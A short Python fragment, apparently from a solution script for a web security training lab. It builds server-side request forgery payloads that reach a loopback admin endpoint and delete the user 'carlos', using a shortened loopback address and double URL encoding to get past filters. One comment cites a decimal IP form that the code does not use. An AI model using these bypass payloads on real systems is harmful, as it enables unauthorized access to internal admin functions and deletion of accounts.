...
def delete_user(url):
    # 127.0.0.1 is encoded into 2130706433
    # a in admin is double-URL-encoded
    ssrf_payload = "http://127.1/%25%36%31dmin/delete?username=carlos"
    ...
    admin_ssrf_payload = "http://127.1/%25%36%31dmin"
